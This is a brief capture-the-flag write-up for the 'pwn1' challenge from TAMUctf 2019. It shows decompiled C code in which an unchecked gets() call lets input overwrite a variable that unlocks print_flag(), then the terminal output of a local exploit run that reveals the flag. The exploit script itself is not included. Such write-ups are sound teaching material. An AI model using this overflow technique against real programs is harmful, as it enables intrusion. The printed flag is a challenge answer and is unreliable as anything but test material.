# Tamu19 pwn1

There is a ```gets```, which we can use to overflow into the variable that triggers the ```print_flag()``` function call.

```c
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
```

```bash
[root@pwn:~/tamu19_pwn1]$ python expl.py 
[+] Starting local process './pwn1': pid 1851
[*] Switching to interactive mode
[*] Process './pwn1' stopped with exit code 0 (pid 1851)
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz}
```